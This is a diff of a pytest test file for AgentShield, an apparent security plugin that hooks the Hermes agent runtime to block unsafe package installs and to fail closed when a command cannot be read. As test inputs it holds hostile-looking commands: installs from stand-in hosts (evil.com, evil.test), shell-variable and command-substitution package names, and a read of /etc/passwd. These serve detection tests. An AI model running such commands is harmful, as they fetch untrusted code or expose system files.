@@ -1,12 +1,20 @@
 """Integration tests for the Hermes Agent plugin.
 
-These tests exercise the full plugin → scanner → response-engine pipeline
-using mocked enrichment calls (no real network access).
+These exercise the **real** Hermes plugin contract: a ``register(ctx)`` entry
+point that wires a ``pre_tool_call`` hook, and the hook callback's
+``{"action": "block", ...}`` / ``None`` return values.  A fake ``PluginContext``
+stands in for the Hermes runtime so we drive the exact path Hermes drives.
+
+The previous tests called a non-existent ``before_tool_call`` method directly,
+which is why a totally-unwired plugin passed CI while silently failing in the
+live agent. The contract test below now fails if the plugin is ever wired to a
+hook name Hermes does not actually invoke.
 """
 
 from __future__ import annotations
 
 from pathlib import Path
+from typing import Any
 from unittest.mock import AsyncMock, patch
 
 import pytest
@@ -15,752 +23,349 @@ from agentshield.core.config import Config
 from agentshield.core.models import (
     Decision,
     DecisionAction,
-    Ecosystem,
-    FileScanResult,
     Finding,
     ScanRequest,
     ScanResult,
     Severity,
 )
-from agentshield.integrations.hermes._types import ToolCall, ToolResult
+from agentshield.integrations.hermes import register
 from agentshield.integrations.hermes.plugin import (
-    AgentShieldPlugin,
-    _find_shell_suspicions,
-    _parse_shell_packages,
-    _tokenize_packages,
+    _HOOK_NAME,
+    HermesGuard,
+    intercepted_tools,
+)
+
+# Hook names the real NousResearch Hermes runtime actually invokes (from its
+# plugin/event-hooks docs). If the plugin registers anything outside this set,
+# it will never fire — exactly the bug this rewrite fixes.
+REAL_HERMES_HOOKS = frozenset(
+    {
+        "pre_tool_call",
+        "post_tool_call",
+        "pre_llm_call",
+        "post_llm_call",
+        "on_session_start",
+        "on_session_end",
+        "on_session_finalize",
+        "on_session_reset",
+        "subagent_stop",
+        "pre_gateway_dispatch",
+        "transform_tool_result",
+    }
 )
 
 
-def _make_plugin(tmp_path: Path, extra_config: dict | None = None) -> AgentShieldPlugin:
+class FakeCtx:
+    """Minimal stand-in for Hermes' PluginContext."""
+
+    def __init__(self, config: dict | None = None) -> None:
+        self.hooks: dict[str, list[Any]] = {}
+        self.config = config or {}
+
+    def register_hook(self, name: str, callback: Any) -> None:
+        self.hooks.setdefault(name, []).append(callback)
+
+
+class FakeCtxNoHooks:
+    """A host that does NOT expose register_hook (incompatible build)."""
+
+    def __init__(self) -> None:
+        self.config: dict = {}
+
+
+def _make_guard(tmp_path: Path, extra_config: dict | None = None) -> HermesGuard:
     base: dict = {"cache": {"db_path": str(tmp_path / "test.db")}}
     if extra_config:
         base.update(extra_config)
     config = Config.model_validate(base)
-    return AgentShieldPlugin(config=config)
+    return HermesGuard(config=config)
 
 
-def _clean_result(request: ScanRequest) -> ScanResult:
+def _register_guard(tmp_path: Path, extra_config: dict | None = None) -> tuple[FakeCtx, Any]:
+    """Register via the real entry point and return (ctx, the wired callback)."""
+    config = Config.model_validate(
+        {"cache": {"db_path": str(tmp_path / "test.db")}, **(extra_config or {})}
+    )
+    ctx = FakeCtx()
+    with patch(
+        "agentshield.integrations.hermes.plugin.AgentShield",
+        return_value=_FakeShield(config),
+    ):
+        register(ctx)
+    callback = ctx.hooks[_HOOK_NAME][0]
+    return ctx, callback
+
+
+class _FakeShield:
+    """Stand-in AgentShield whose ascan is patched per-test."""
+
+    def __init__(self, config: Config) -> None:
+        self.config = config
+
+    async def ascan(self, request: ScanRequest) -> ScanResult:  # pragma: no cover - patched
+        raise AssertionError("ascan should be patched in the test")
+
+    def scan(self, request: ScanRequest) -> ScanResult:  # pragma: no cover - patched
+        raise AssertionError("scan should be patched in the test")
+
+
+def _clean(req: ScanRequest) -> ScanResult:
     return ScanResult(
-        request=request,
+        request=req,
         findings=[],
         max_severity=Severity.NONE,
         decision=Decision(action=DecisionAction.ALLOW, reason="No issues found"),
     )
 
 
-def _block_result(request: ScanRequest, finding: Finding) -> ScanResult:
+def _block(req: ScanRequest) -> ScanResult:
+    finding = Finding(
+        rule_id="T1.1", title="Known malicious", severity=Severity.CRITICAL, source="malicious_db"
+    )
     return ScanResult(
-        request=request,
+        request=req,
         findings=[finding],
         max_severity=Severity.CRITICAL,
         decision=Decision(
-            action=DecisionAction.BLOCK,
-            reason=f"BLOCK due to {finding.rule_id}",
-            findings=[finding],
+            action=DecisionAction.BLOCK, reason="BLOCK due to T1.1", findings=[finding]
         ),
     )
 
 
-def _warn_result(request: ScanRequest, finding: Finding) -> ScanResult:
+def _warn(req: ScanRequest) -> ScanResult:
+    finding = Finding(
+        rule_id="CVE-2024-9999", title="High CVE", severity=Severity.HIGH, source="osv"
+    )
     return ScanResult(
-        request=request,
+        request=req,
         findings=[finding],
         max_severity=Severity.HIGH,
         decision=Decision(
             action=DecisionAction.NEEDS_CONFIRMATION,
-            reason=f"NEEDS_CONFIRMATION due to {finding.rule_id}",
+            reason="NEEDS_CONFIRMATION due to CVE-2024-9999",
             findings=[finding],
         ),
     )
 
 
-# ── Pass-through (ALLOW) ──────────────────────────────────────────────────────
+# ── registration / contract ──────────────────────────────────────────────────
 
 
-@pytest.mark.asyncio
-async def test_clean_package_passes_through(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="pip_install", args={"package": "requests"})
-    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")
-
-    with patch.object(plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))):
-        result = await plugin.before_tool_call(call)
-
-    # Must return the original ToolCall unmodified (ALLOW → pass through)
-    assert result is call
+def test_register_wires_pre_tool_call(tmp_path):
+    ctx, callback = _register_guard(tmp_path)
+    assert _HOOK_NAME in ctx.hooks
+    assert callable(callback)
 
 
-@pytest.mark.asyncio
-async def test_non_intercepted_tool_passes_through(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="read_file", args={"path": "/etc/passwd"})
+def test_registered_hook_name_is_one_hermes_actually_calls():
+    # Regression guard: the old code used a `before_tool_call` method that Hermes
+    # never invokes. Fail loudly if we ever drift to a non-existent hook.
+    assert _HOOK_NAME == "pre_tool_call"
+    assert _HOOK_NAME in REAL_HERMES_HOOKS
 
-    # Shield should never be called for non-install tools
-    with patch.object(plugin.shield, "ascan", new=AsyncMock()) as mock_scan:
-        result = await plugin.before_tool_call(call)
 
-    assert result is call
+def test_register_on_incompatible_host_does_not_raise_and_is_not_registered(tmp_path, caplog):
+    config = Config.model_validate({"cache": {"db_path": str(tmp_path / "t.db")}})
+    with patch(
+        "agentshield.integrations.hermes.plugin.AgentShield",
+        return_value=_FakeShield(config),
+    ):
+        guard = register(FakeCtxNoHooks())
+    assert guard.registered is False  # could not wire — surfaced, not silent
+
+
+def test_intercepted_tools_includes_terminal_and_execute_code():
+    tools = intercepted_tools()
+    assert "terminal" in tools
+    assert "execute_code" in tools
+
+
+# ── shell tool interception via the hook ──────────────────────────────────────
+
+
+def test_terminal_clean_install_allows(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock(side_effect=lambda r: _clean(r))):
+        result = guard.pre_tool_call("terminal", {"command": "pip install requests"}, "t1")
+    assert result is None
+
+
+def test_terminal_bad_install_blocks(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock(side_effect=lambda r: _block(r))):
+        result = guard.pre_tool_call("terminal", {"command": "pip install evil-pkg"}, "t1")
+    assert result is not None
+    assert result["action"] == "block"
+    assert "evil-pkg" in result["message"]
+
+
+def test_terminal_non_install_command_allows(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock()) as mock_scan:
+        result = guard.pre_tool_call("terminal", {"command": "ls -la /tmp"}, "t1")
+    assert result is None
     mock_scan.assert_not_called()
 
 
-# ── BLOCK decision ────────────────────────────────────────────────────────────
-
-
-@pytest.mark.asyncio
-async def test_blocked_package_returns_tool_error(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="pip_install", args={"package": "evil-pkg"})
-    req = ScanRequest(package="evil-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
-    finding = Finding(
-        rule_id="T1.1",
-        title="Known malicious package",
-        severity=Severity.CRITICAL,
-        source="malicious_db",
-    )
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
-    ):
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    assert "blocked" in (result.error_message or "").lower()
-    assert "pip_install" in (result.error_message or "") or "evil-pkg" in (
-        result.error_message or ""
-    )
-
-
-@pytest.mark.asyncio
-async def test_blocked_npm_package(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="npm_install", args={"package": "evil-npm"})
-    req = ScanRequest(package="evil-npm", ecosystem=Ecosystem.NPM, source="hermes")
-    finding = Finding(
-        rule_id="T1.1",
-        title="Malicious npm package",
-        severity=Severity.CRITICAL,
-        source="malicious_db",
-    )
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
-    ):
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-
-
-@pytest.mark.asyncio
-async def test_blocked_cargo_package(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="cargo_add", args={"package": "evil-crate"})
-    req = ScanRequest(package="evil-crate", ecosystem=Ecosystem.CARGO, source="hermes")
-    finding = Finding(
-        rule_id="T1.1",
-        title="Malicious crate",
-        severity=Severity.CRITICAL,
-        source="malicious_db",
-    )
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
-    ):
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-
-
-# ── NEEDS_CONFIRMATION decision ───────────────────────────────────────────────
-
-
-@pytest.mark.asyncio
-async def test_warn_package_returns_confirmation_request(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="pip_install", args={"package": "suspicious-pkg"})
-    req = ScanRequest(package="suspicious-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
-    finding = Finding(
-        rule_id="CVE-2024-9999",
-        title="High severity CVE",
-        severity=Severity.HIGH,
-        source="osv",
-    )
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_warn_result(req, finding))
-    ):
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.requires_confirmation
-    assert result.on_confirm is call
-    assert "CVE-2024-9999" in result.confirmation_message or "issue" in result.confirmation_message
-
-
-# ── ScanRequest construction ──────────────────────────────────────────────────
-
-
-@pytest.mark.asyncio
-async def test_scan_request_uses_package_from_args(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(
-        name="pip_install",
-        args={"package": "numpy", "version": "1.24.0"},
-    )
-
-    captured: list[ScanRequest] = []
-
-    async def _mock_scan(r: ScanRequest) -> ScanResult:
-        captured.append(r)
-        return _clean_result(r)
-
-    with patch.object(plugin.shield, "ascan", new=_mock_scan):
-        await plugin.before_tool_call(call)
-
-    assert captured[0].package == "numpy"
-    assert captured[0].version == "1.24.0"
-    assert captured[0].ecosystem == Ecosystem.PYPI
-    assert captured[0].source == "hermes"
-
-
-@pytest.mark.asyncio
-async def test_context_hint_forwarded(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(
-        name="pip_install",
-        args={"package": "flask", "reason": "Building a web API"},
-    )
-
-    captured: list[ScanRequest] = []
-
-    async def _mock_scan(r: ScanRequest) -> ScanResult:
-        captured.append(r)
-        return _clean_result(r)
-
-    with patch.object(plugin.shield, "ascan", new=_mock_scan):
-        await plugin.before_tool_call(call)
-
-    assert captured[0].context_hint == "Building a web API"
-
-
-# ── Denylist short-circuit (real scanner, no network) ─────────────────────────
-
-
-@pytest.mark.asyncio
-async def test_denylist_blocks_via_plugin(tmp_path):
-    plugin = _make_plugin(tmp_path, {"denylist": ["colouredlogs"]})
-    call = ToolCall(name="pip_install", args={"package": "colouredlogs"})
-
-    result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    assert (
-        "colouredlogs" in (result.error_message or "").lower()
-        or "blocked" in (result.error_message or "").lower()
-    )
-
-
-# ── _parse_shell_packages unit tests ─────────────────────────────────────────
-
-
-def test_parse_pip_install_basic():
-    pkgs = _parse_shell_packages("pip install requests")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_pip3_install():
-    pkgs = _parse_shell_packages("pip3 install flask")
-    assert pkgs == [("flask", Ecosystem.PYPI)]
-
-
-def test_parse_python_m_pip():
-    pkgs = _parse_shell_packages("python -m pip install numpy")
-    assert pkgs == [("numpy", Ecosystem.PYPI)]
-
-
-def test_parse_uv_pip_install():
-    pkgs = _parse_shell_packages("uv pip install httpx")
-    assert pkgs == [("httpx", Ecosystem.PYPI)]
-
-
-def test_parse_pip_install_with_break_system_packages():
-    pkgs = _parse_shell_packages("pip install --break-system-packages requests")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_pip_install_version_specifier():
-    pkgs = _parse_shell_packages("pip install requests==2.28.0")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_pip_install_extras():
-    pkgs = _parse_shell_packages("pip install requests[security]>=2.28.0")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_pip_install_multiple_packages():
-    pkgs = _parse_shell_packages("pip install requests numpy pandas==1.5.0")
-    assert pkgs == [
-        ("requests", Ecosystem.PYPI),
-        ("numpy", Ecosystem.PYPI),
-        ("pandas", Ecosystem.PYPI),
-    ]
-
-
-def test_parse_pip_install_with_upgrade_flag():
-    pkgs = _parse_shell_packages("pip install -U requests")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_pip_install_with_user_flag():
-    pkgs = _parse_shell_packages("pip install --user requests")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_pip_install_skips_requirements_file():
-    # -r takes the next token as a value, so req.txt should be skipped
-    pkgs = _parse_shell_packages("pip install -r requirements.txt requests")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_pip_install_index_url():
-    pkgs = _parse_shell_packages("pip install --index-url https://pypi.org/simple requests")
-    assert pkgs == [("requests", Ecosystem.PYPI)]
-
-
-def test_parse_npm_install():
-    pkgs = _parse_shell_packages("npm install express")
-    assert pkgs == [("express", Ecosystem.NPM)]
-
-
-def test_parse_npm_i_shorthand():
-    pkgs = _parse_shell_packages("npm i lodash")
-    assert pkgs == [("lodash", Ecosystem.NPM)]
-
-
-def test_parse_yarn_add():
-    pkgs = _parse_shell_packages("yarn add react react-dom")
-    assert pkgs == [("react", Ecosystem.NPM), ("react-dom", Ecosystem.NPM)]
-
-
-def test_parse_cargo_add():
-    pkgs = _parse_shell_packages("cargo add serde")
-    assert pkgs == [("serde", Ecosystem.CARGO)]
-
-
-def test_parse_cargo_install():
-    pkgs = _parse_shell_packages("cargo install ripgrep")
-    assert pkgs == [("ripgrep", Ecosystem.CARGO)]
-
-
-def test_parse_chained_commands():
-    cmd = "pip install requests && npm install express"
-    pkgs = _parse_shell_packages(cmd)
-    assert ("requests", Ecosystem.PYPI) in pkgs
-    assert ("express", Ecosystem.NPM) in pkgs
-
-
-def test_parse_no_install_command():
-    pkgs = _parse_shell_packages("ls -la /tmp")
-    assert pkgs == []
-
-
-def test_parse_empty_command():
-    assert _parse_shell_packages("") == []
-
-
-def test_tokenize_packages_strips_flags():
-    pkgs = _tokenize_packages("--break-system-packages --user requests numpy")
-    assert pkgs == ["requests", "numpy"]
-
-
-def test_tokenize_packages_skips_paths():
-    pkgs = _tokenize_packages("/usr/local requests")
-    assert pkgs == ["requests"]
-
-
-def test_tokenize_packages_skips_urls():
-    pkgs = _tokenize_packages("https://example.com/pkg requests")
-    assert pkgs == ["requests"]
-
-
-# ── Shell tool interception (plugin-level) ────────────────────────────────────
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_no_install_passes_through(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "ls -la /tmp"})
-
-    with patch.object(plugin.shield, "ascan", new=AsyncMock()) as mock_scan:
-        result = await plugin.before_tool_call(call)
-
-    assert result is call
+def test_execute_code_with_terminal_install_blocks(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock(side_effect=lambda r: _block(r))):
+        result = guard.pre_tool_call(
+            "execute_code",
+            {"code": "from hermes_tools import terminal\nterminal('pip install evil-pkg')"},
+            "t1",
+        )
+    assert result is not None
+    assert result["action"] == "block"
+
+
+# ── the fail-OPEN bug, now fail-CLOSED ────────────────────────────────────────
+
+
+def test_terminal_unknown_arg_key_fails_closed(tmp_path):
+    """An intercepted shell tool whose command we cannot read must FAIL CLOSED.
+
+    This is the exact latent bug: the old code returned the call unchanged when
+    no command/cmd/code key was present, silently allowing the install.
+    """
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock()) as mock_scan:
+        result = guard.pre_tool_call("terminal", {"input": "pip install evil-pkg"}, "t1")
+    assert result is not None
+    assert result["action"] == "block"
+    assert "fail closed" in result["message"]
     mock_scan.assert_not_called()
 
 
-@pytest.mark.asyncio
-async def test_bash_tool_pip_install_clean_passes_through(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(
-        name="bash",
-        args={"command": "pip install --break-system-packages requests"},
+def test_terminal_empty_command_allows(tmp_path):
+    guard = _make_guard(tmp_path)
+    result = guard.pre_tool_call("terminal", {"command": "   "}, "t1")
+    assert result is None
+
+
+def test_scanner_error_fails_closed(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock(side_effect=RuntimeError("boom"))):
+        result = guard.pre_tool_call("terminal", {"command": "pip install requests"}, "t1")
+    assert result is not None
+    assert result["action"] == "block"
+    assert "fail closed" in result["message"]
+
+
+def test_shell_expansion_fails_closed(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock()) as mock_scan:
+        result = guard.pre_tool_call("terminal", {"command": "pip install $PKG"}, "t1")
+    assert result is not None
+    assert result["action"] == "block"
+    mock_scan.assert_not_called()
+
+
+def test_unsupported_manager_fails_closed(tmp_path):
+    guard = _make_guard(tmp_path)
+    result = guard.pre_tool_call("terminal", {"command": "gem install foo"}, "t1")
+    assert result is not None
+    assert result["action"] == "block"
+
+
+# ── NEEDS_CONFIRMATION → block (no "ask" in Hermes hooks) ─────────────────────
+
+
+def test_warn_blocks_pending_review(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock(side_effect=lambda r: _warn(r))):
+        result = guard.pre_tool_call("terminal", {"command": "pip install suspicious-pkg"}, "t1")
+    assert result is not None
+    assert result["action"] == "block"
+    assert "review" in result["message"].lower()
+
+
+# ── non-intercepted tools ─────────────────────────────────────────────────────
+
+
+def test_non_intercepted_tool_passes_through(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock()) as mock_scan:
+        result = guard.pre_tool_call("read_file", {"path": "/etc/passwd"}, "t1")
+    assert result is None
+    mock_scan.assert_not_called()
+
+
+def test_callback_never_raises_on_bad_args(tmp_path):
+    guard = _make_guard(tmp_path)
+    # args is None and weird kwargs — must not raise.
+    result = guard.pre_tool_call("terminal", None, "t1")
+    assert result is not None  # no command readable → fail closed
+    assert result["action"] == "block"
+
+
+# ── structured install tools (non-Hermes agents reuse the guard) ──────────────
+
+
+def test_structured_pip_install_blocks(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock(side_effect=lambda r: _block(r))):
+        result = guard.pre_tool_call("pip_install", {"package": "evil-pkg"}, "t1")
+    assert result is not None
+    assert result["action"] == "block"
+
+
+def test_structured_pip_install_clean_allows(tmp_path):
+    guard = _make_guard(tmp_path)
+    with patch.object(guard.shield, "ascan", new=AsyncMock(side_effect=lambda r: _clean(r))):
+        result = guard.pre_tool_call("pip_install", {"package": "requests"}, "t1")
+    assert result is None
+
+
+# ── real denylist (no mock) through the full path ─────────────────────────────
+
+
+def test_denylist_blocks_terminal_install(tmp_path):
+    guard = _make_guard(tmp_path, {"denylist": ["colouredlogs"]})
+    result = guard.pre_tool_call(
+        "terminal", {"command": "pip install --break-system-packages colouredlogs"}, "t1"
     )
-    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")
-
-    with patch.object(plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))):
-        result = await plugin.before_tool_call(call)
-
-    assert result is call
+    assert result is not None
+    assert result["action"] == "block"
+    assert "colouredlogs" in result["message"].lower()
 
 
-@pytest.mark.asyncio
-async def test_bash_tool_pip_install_blocked(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(
-        name="bash",
-        args={"command": "pip install --break-system-packages evil-pkg"},
-    )
-    req = ScanRequest(package="evil-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
-    finding = Finding(
-        rule_id="T1.1",
-        title="Known malicious package",
-        severity=Severity.CRITICAL,
-        source="malicious_db",
-    )
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_block_result(req, finding))
-    ):
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    assert "evil-pkg" in (result.error_message or "")
-    assert "blocked" in (result.error_message or "").lower()
+# ── sync wrapper works even with a running event loop ─────────────────────────
 
 
 @pytest.mark.asyncio
-async def test_bash_tool_pip_install_needs_confirmation(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(
-        name="bash",
-        args={"command": "pip install suspicious-pkg"},
-    )
-    req = ScanRequest(package="suspicious-pkg", ecosystem=Ecosystem.PYPI, source="hermes")
-    finding = Finding(
-        rule_id="CVE-2024-9999",
-        title="High severity CVE",
-        severity=Severity.HIGH,
-        source="osv",
-    )
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_warn_result(req, finding))
-    ):
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.requires_confirmation
-    assert result.on_confirm is call
-
-
-@pytest.mark.asyncio
-async def test_shell_requirements_file_is_scanned(tmp_path):
-    """`pip install -r requirements.txt` must scan the referenced manifest."""
-    plugin = _make_plugin(tmp_path)
-    req_file = tmp_path / "requirements.txt"
-    req_file.write_text("evil-pkg==1.0.0\n")
-    call = ToolCall(name="bash", args={"command": f"pip install -r {req_file}"})
-
-    file_result = FileScanResult(
-        path=str(req_file),
-        results=[],
-        aggregate_decision=Decision(action=DecisionAction.BLOCK, reason="1 package(s) blocked"),
-        total_packages=1,
-        blocked=1,
-    )
-    with patch.object(
-        plugin.shield, "ascan_file", new=AsyncMock(return_value=file_result)
-    ) as mock_scan_file:
-        result = await plugin.before_tool_call(call)
-
-    mock_scan_file.assert_called_once()
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    assert str(req_file) in (result.error_message or "")
-
-
-@pytest.mark.asyncio
-async def test_shell_missing_requirements_file_passes_through(tmp_path):
-    """A referenced manifest that does not exist is skipped (install would fail anyway)."""
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "pip install -r /nonexistent/req.txt"})
-
-    with patch.object(plugin.shield, "ascan_file", new=AsyncMock()) as mock_scan_file:
-        result = await plugin.before_tool_call(call)
-
-    mock_scan_file.assert_not_called()
-    assert result is call
-
-
-@pytest.mark.asyncio
-async def test_shell_remote_requirements_file_blocked(tmp_path):
-    """A remote -r URL cannot be verified and is blocked as a suspicion."""
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "pip install -r https://evil.test/req.txt"})
-    result = await plugin.before_tool_call(call)
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    assert "remote requirements file" in (result.error_message or "")
-
-
-@pytest.mark.asyncio
-@pytest.mark.parametrize("tool_name", ["bash", "shell", "run_command", "execute", "terminal"])
-async def test_all_shell_tool_names_intercepted(tmp_path, tool_name):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name=tool_name, args={"command": "pip install requests"})
-    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))
-    ) as mock_scan:
-        result = await plugin.before_tool_call(call)
-
-    assert result is call
-    mock_scan.assert_called_once()
-
-
-@pytest.mark.asyncio
-async def test_shell_cmd_key_alias(tmp_path):
-    """Tool args key 'cmd' (instead of 'command') should also be recognised."""
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"cmd": "pip install requests"})
-    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))
-    ) as mock_scan:
-        result = await plugin.before_tool_call(call)
-
-    assert result is call
-    mock_scan.assert_called_once()
-
-
-@pytest.mark.asyncio
-async def test_shell_code_key_alias(tmp_path):
-    """Tool args key 'code' should also be recognised."""
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"code": "pip install requests"})
-    req = ScanRequest(package="requests", ecosystem=Ecosystem.PYPI, source="hermes")
-
-    with patch.object(
-        plugin.shield, "ascan", new=AsyncMock(return_value=_clean_result(req))
-    ) as mock_scan:
-        result = await plugin.before_tool_call(call)
-
-    assert result is call
-    mock_scan.assert_called_once()
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_multiple_packages_first_block_wins(tmp_path):
-    """When multiple packages are found, a BLOCK on any one blocks the whole command."""
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(
-        name="bash",
-        args={"command": "pip install requests evil-pkg numpy"},
-    )
-    finding = Finding(
-        rule_id="T1.1",
-        title="Known malicious",
-        severity=Severity.CRITICAL,
-        source="malicious_db",
-    )
-
-    async def _side_effect(request: ScanRequest) -> ScanResult:
-        if request.package == "evil-pkg":
-            return _block_result(request, finding)
-        return _clean_result(request)
-
-    with patch.object(plugin.shield, "ascan", new=_side_effect):
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    assert "evil-pkg" in (result.error_message or "")
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_npm_install(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "npm install express"})
-
-    captured: list[ScanRequest] = []
-
-    async def _capture(r: ScanRequest) -> ScanResult:
-        captured.append(r)
-        return _clean_result(r)
-
-    with patch.object(plugin.shield, "ascan", new=_capture):
-        await plugin.before_tool_call(call)
-
-    assert captured[0].package == "express"
-    assert captured[0].ecosystem == Ecosystem.NPM
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_cargo_add(tmp_path):
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "cargo add serde"})
-
-    captured: list[ScanRequest] = []
-
-    async def _capture(r: ScanRequest) -> ScanResult:
-        captured.append(r)
-        return _clean_result(r)
-
-    with patch.object(plugin.shield, "ascan", new=_capture):
-        await plugin.before_tool_call(call)
-
-    assert captured[0].package == "serde"
-    assert captured[0].ecosystem == Ecosystem.CARGO
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_denylist_blocks(tmp_path):
-    """Real scanner (no mock) — denylist entry blocks the bash command."""
-    plugin = _make_plugin(tmp_path, {"denylist": ["colouredlogs"]})
-    call = ToolCall(
-        name="bash",
-        args={"command": "pip install --break-system-packages colouredlogs"},
-    )
-
-    result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    assert (
-        "colouredlogs" in (result.error_message or "").lower()
-        or "blocked" in (result.error_message or "").lower()
-    )
-
-
-# ── Shell suspicion detection (_find_shell_suspicions) ───────────────────────
-
-
-def test_find_suspicions_dollar_var():
-    s = _find_shell_suspicions("pip install $PKG")
-    assert len(s) == 1
-    assert "$PKG" in s[0]
-
-
-def test_find_suspicions_braced_var():
-    s = _find_shell_suspicions("pip install ${EVIL_PKG}")
-    assert len(s) == 1
-    assert "${EVIL_PKG}" in s[0]
-
-
-def test_find_suspicions_command_sub():
-    s = _find_shell_suspicions("pip install $(get_pkg)")
-    assert len(s) == 1
-    assert "$(get_pkg)" in s[0]
-
-
-def test_find_suspicions_git_plus_https():
-    s = _find_shell_suspicions("pip install git+https://evil.com/pkg.git")
-    assert len(s) == 1
-    assert "git+https://" in s[0]
-
-
-def test_find_suspicions_git_plus_ssh():
-    s = _find_shell_suspicions("pip install git+ssh://github.com/user/repo.git")
-    assert len(s) == 1
-    assert "git+ssh://" in s[0]
-
-
-def test_find_suspicions_clean_package_no_suspicions():
-    assert _find_shell_suspicions("pip install requests") == []
-
-
-def test_find_suspicions_non_install_command():
-    assert _find_shell_suspicions("echo $HOME") == []
-
-
-def test_find_suspicions_multiple_patterns():
-    s = _find_shell_suspicions("pip install $PKG git+https://evil.com/pkg.git")
-    assert len(s) == 2
-
-
-# ── Plugin blocks on suspicious shell patterns ───────────────────────────────
-
-
-@pytest.mark.asyncio
-async def test_bash_tool_env_var_in_package_blocked(tmp_path):
-    """pip install $PKG must be blocked — the package name cannot be verified."""
-    plugin = _make_plugin(tmp_path)
-    call = ToolCall(name="bash", args={"command": "pip install $EVIL_PKG"})
-
-    with patch.object(plugin.shield, "ascan", new=AsyncMock()) as mock_scan:
-        result = await plugin.before_tool_call(call)
-
-    assert isinstance(result, ToolResult)
-    assert result.is_error
-    mock_scan.assert_not_called()  # scanner must not be called for unanalyzable args
-
-
